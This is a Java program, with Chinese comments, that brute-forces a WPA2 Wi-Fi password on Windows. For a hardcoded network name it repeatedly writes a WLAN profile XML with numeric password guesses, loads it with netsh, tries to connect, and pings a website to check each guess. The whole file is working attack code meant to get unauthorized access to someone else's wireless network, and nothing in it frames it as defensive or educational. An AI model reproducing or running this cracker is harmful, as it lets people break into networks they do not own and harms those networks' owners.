/**
 * @author 袁存波
 * @version 1.0
 * @create 2023-07-05 20:50
 */

import java.io.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Demo {

    public static final String CODE_UTF8 = "utf-8";
    public static final String CODE_GBK = "gbk";
    public static final String DEFAULT_PATH = "E://wifi";//默认wifi配置文件生成路径

    public static final String WIFI_LIST = "netsh wlan show networks mode=bssid";// 列出所有可用wifi
    public static final String WIFI_ADDFILE = "netsh wlan add profile filename=";// 添加配置文件,后面需要加上你生成的配置文件名称
    public static final String WIFI_CONNECT = "netsh wlan connect name=";// 连接wifi,后面加上你需要连接的wifi名称

    public static final String TEST_CONNECT = "ping www.baidu.com";//wifi连接后测试是否ping通的一个网址

    //一个配置文件模板
    public static String XML_FORMAT = "<?xml version=\"1.0\"?>"
            + "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">"
            + "<name>WIFI_NAME</name>"
            + "<SSIDConfig>"
            + "<SSID>"
            + "<name>WIFI_NAME</name>"
            + "</SSID>"
            + "</SSIDConfig>"
            + "<connectionType>ESS</connectionType>"
            + "<connectionMode>manual</connectionMode>"
            + "<MSM>"
            + "<security>"
            + "<authEncryption>"
            + "<authentication>WPA2PSK</authentication>"
            + "<encryption>AES</encryption>"
            + "<useOneX>false</useOneX>"
            + "</authEncryption>"
            + "<sharedKey>"
            + "<keyType>passPhrase</keyType>"
            + "<protected>false</protected>"
            + "<keyMaterial>PASSWORD</keyMaterial>"
            + "</sharedKey>"
            + "</security>"
            + "</MSM>"
            + "<MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\">"
            + "<enableRandomization>false</enableRandomization>"
            + "</MacRandomization>"
            + "</WLANProfile>";


    public static void main(String[] args) {
        //列出所有的可用wifi，key是wifi名称，value是wifi的强度(用这个不如自己打开wifi看附近有哪些可用来得快)
//		Map<String,String> map = getWifi();
//		for(String key:map.keySet()){
//			System.out.println(key+"..."+map.get(key));
//		}
        boolean flag = true;
        String wifiName = "Chinanet-2.4G-96D0";//wifi测试账号
        String password = "";//wifi测试密码
        /**
         * 测试  找一个正确的测试
         */
        password = "00000000";//一直更换这个密码就好了
        if (testConnected(wifiName, password)) {
            System.out.println("密码正确");
            flag = false;
        }

        while (flag) {
            for (int i = 10000000; i <= 99999999999L; i++) {
                password = String.valueOf(i);
                System.out.println("使用密码" + i);//10000202
                if (testConnected(wifiName, password)) {
                    flag = false;
                }
            }

        }
    }


    /**
     * 尝试对指定wifi设定一个密码，然后连接，连接成功返回true
     */
    public static boolean testConnected(String wifiName, String password) {
        boolean flag = false;
        System.out.println("开始生成配置文件......");
        if (!createXml(wifiName, password, DEFAULT_PATH)) {
            System.out.println("配置文件生成失败......");
            return false;
        }
        System.out.println("开始加载配置文件......");
        if (!addXml(wifiName, DEFAULT_PATH)) {
            System.out.println("配置文件加载失败......");
            return false;
        }
        System.out.println("***********************************************************");
        System.out.println("***********************************************************");
        System.out.println("*开始尝试连接......");
        execute(WIFI_CONNECT + wifiName, DEFAULT_PATH);
        System.out.println("*正在检查密码是正确");
        if (connectResult()) {
            System.out.println("*连接成功,密码是:" + password);
            flag = true;
        } else {
            System.out.println("*连接失败,请更换密码");
            flag = false;
        }
        System.out.println("###########################################################");
        System.out.println("###########################################################");
        System.out.println(" \n\n\n\n");
        return flag;
    }

    /**
     * 最后，ping 一个地址，测试是否真的连上网络了
     */
    public static boolean connectResult() {
        try {
            System.out.println("测试初始化开始");
            Thread.sleep(1000);//这个休眠的意义是即时连接成功，你立刻ping 也还是会失败，必须让电脑反应过来，必须等一会
            System.out.println("测试初始化结束");
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println("开始检查");
        boolean flag = true;
        for (String rs : execute(TEST_CONNECT, DEFAULT_PATH)) {
            if ("Ping 请求找不到主机 www.baidu.com。请检查该名称，然后重试。".equals(rs)) {
                flag = false;
                break;
            }
        }
        System.out.println("检查结束");
        return flag;
    }

    /**
     * 在指定目录下，加载指定wifi名称的配置文件
     */
    public static boolean addXml(String wifiName, String path) {
        boolean flag = false;
        for (String rs : execute(WIFI_ADDFILE + wifiName + ".xml", path)) {
            if (("已将配置文件 " + wifiName + " 添加到接口 WLAN。").equals(rs)) {
                flag = true;
                break;
            }
        }
        return flag;
    }

    /**
     * 在指定目录下，对指定wifi生成一个指定密码的配置文件，文件名为wifi.xml
     */
    public static boolean createXml(String wifiName, String password, String path) {
        boolean flag = false;
        File file = new File(path, wifiName + ".xml");
        try {
            if (!file.exists()) {
                file.mkdirs();
            }
            PrintStream ps = new PrintStream(file);
            String str = XML_FORMAT.replaceAll("WIFI_NAME", wifiName).replaceAll("PASSWORD", password);
            ps.println(str);
            ps.close();
            flag = true;

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        return flag;
    }

//    /**
//     * 获取所有可用的wifi名称,key是wifi名称，value是信号强度
//     */
//    public static Map<String, String> getWifi() {
//        Map<String, String> map = new HashMap<>();
//        //这里使用UTF-8去获取，中文名称的wifi不会乱码
//        String key = null;
//        String value = null;
//        boolean saveFlag = false;
//        for (String str : execute(WIFI_LIST, null, CODE_UTF8)) {
//            if (str.startsWith("SSID")) {
//                key = str.substring(9, str.length());
//            } else if (str.endsWith("%")) {
//                value = str.substring(str.length() - 3, str.length() - 1);
//                saveFlag = true;
//            }
//            if (saveFlag) {
//                map.put(key, value);
//                saveFlag = false;
//            }
//        }
//        return map;
//    }

    /**
     * 在指定目录下执行指定命令,默认使用GBK编码
     */
    public static List<String> execute(String cmd, String filePath) {
        return execute(cmd, filePath, CODE_GBK);
    }

    /**
     * 在指定目录下执行指定命令,返回指定编码的内容
     */
    public static List<String> execute(String cmd, String filePath, String code) {
        System.out.println("cmd命令加载中……");
        Process process = null;
        List<String> result = new ArrayList<String>();
        try {
            if (filePath != null) {
                process = Runtime.getRuntime().exec(cmd, null, new File(filePath));
            } else {
                process = Runtime.getRuntime().exec(cmd);
            }
            BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), code));
            String line = null;
            while ((line = bReader.readLine()) != null) {
                result.add(line);
            }
            System.out.println("cmd命令已经加载成功……");
        } catch (IOException e) {
            e.printStackTrace();
        }

        return result;
    }
}


